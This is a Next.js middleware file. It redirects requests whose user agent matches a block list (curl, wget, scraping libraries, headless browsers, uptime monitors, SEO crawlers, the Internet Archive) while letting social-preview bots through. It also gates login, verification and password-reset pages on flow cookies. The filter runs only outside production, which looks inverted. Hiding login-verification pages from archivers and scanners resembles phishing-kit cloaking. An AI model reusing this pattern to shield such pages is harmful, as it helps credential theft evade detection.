import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

const ALLOWED_BOT_PATTERNS = [
  /facebookexternalhit/i,
  /facebot/i,
  /twitterbot/i,
  /linkedinbot/i,
  /slackbot/i,
  /slack-imgproxy/i,
  /telegrambot/i,
  /whatsapp/i,
  /discordbot/i,
  /pinterest/i,
  /embedly/i,
  /googlebot/i,
  /bingbot/i,
  /applebot/i,
  /viber/i,
  /redditbot/i,
  /tumblr/i,
  /line-poker/i,
  /line-crawler/i,
  /kakaotalk/i,
  /skype/i,
  /wechat/i,
  /flipboard/i,
  /medium/i,
  /bitlybot/i,
  /quora link preview/i,
  /discord/i,
];

const BLOCKED_BOT_PATTERNS = [
  /curl/i,
  /wget/i,
  /python-requests/i,
  /python-urllib/i,
  /scrapy/i,
  /go-http-client/i,
  /postman/i,
  /insomnia/i,
  /selenium/i,
  /webdriver/i,
  /puppeteer/i,
  /playwright/i,
  /phantom/i,
  /headlesschrome/i,
  /chrome-lighthouse/i,
  /prerender/i,
  /browsershot/i,
  /wkhtmltopdf/i,
  /html2pdf/i,
  /uptimerobot/i,
  /pingdom/i,
  /site24x7/i,
  /statuscake/i,
  /nagios/i,
  /rogerbot/i,
  /ahrefsbot/i,
  /semrushbot/i,
  /dotbot/i,
  /mj12bot/i,
  /petalbot/i,
  /libwww/i,
  /lwp-trivial/i,
  /php\/\d/i,
  /^java\s/i,
  /datadog/i,
  /sentry\/\d/i,
  /archive\.org/i,
  /wayback/i,
  /ia_archiver/i,
];

function isAllowedBot(ua: string): boolean {
  return ALLOWED_BOT_PATTERNS.some((p) => p.test(ua));
}

function isBlockedBot(ua: string): boolean {
  return BLOCKED_BOT_PATTERNS.some((p) => p.test(ua));
}

const FORGOT_FLOW_COOKIE = "forgot_flow";
const NEW_USER_FLOW_COOKIE = "new_user_flow";
const LOGIN_FLOW_COOKIE = "login_flow";

const protectedForgotPaths = [
  "/forgot-password-found",
  "/forgot-password-verify",
  "/forgot-password-code",
];

const protectedNewUserPaths = ["/new-user-code", "/new-user-password"];

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  if (
    pathname.startsWith("/api") ||
    pathname.startsWith("/_next") ||
    pathname === "/favicon.ico"
  ) {
    return NextResponse.next();
  }

  if (process.env.NODE_ENV !== "production") {
    const ua = request.headers.get("user-agent") || "";
    if (isAllowedBot(ua)) return NextResponse.next();
    if (isBlockedBot(ua))
      return NextResponse.redirect(new URL("/blocked", request.url));
  }

  if (protectedForgotPaths.includes(pathname)) {
    const hasFlowCookie =
      request.cookies.get(FORGOT_FLOW_COOKIE)?.value === "1";
    if (!hasFlowCookie) {
      const url = request.nextUrl.clone();
      url.pathname = "/forgot-password";
      return NextResponse.redirect(url);
    }
  }

  if (protectedNewUserPaths.includes(pathname)) {
    const flowValue = request.cookies.get(NEW_USER_FLOW_COOKIE)?.value;

    if (pathname === "/new-user-code") {
      if (!(flowValue === "1" || flowValue === "2")) {
        const url = request.nextUrl.clone();
        url.pathname = "/new-user";
        return NextResponse.redirect(url);
      }
    }

    if (pathname === "/new-user-password") {
      if (flowValue !== "2") {
        const url = request.nextUrl.clone();
        url.pathname = "/new-user";
        return NextResponse.redirect(url);
      }
    }
  }

  const loginFlowValue = request.cookies.get(LOGIN_FLOW_COOKIE)?.value;

  if (pathname === "/verify-choice") {
    if (!loginFlowValue) {
      const url = request.nextUrl.clone();
      url.pathname = "/";
      return NextResponse.redirect(url);
    }
  }

  if (pathname === "/verify") {
    const step = request.nextUrl.searchParams.get("step");

    if (step === "2") {
      if (loginFlowValue !== "3") {
        const url = request.nextUrl.clone();
        url.pathname = "/";
        return NextResponse.redirect(url);
      }
    } else {
      if (!loginFlowValue) {
        const url = request.nextUrl.clone();
        url.pathname = "/";
        return NextResponse.redirect(url);
      }
    }
  }

  if (pathname === "/verify-details") {
    if (!(loginFlowValue === "2" || loginFlowValue === "3")) {
      const url = request.nextUrl.clone();
      url.pathname = "/";
      return NextResponse.redirect(url);
    }
  }

  return NextResponse.next();
}

export const config = {
  matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
};
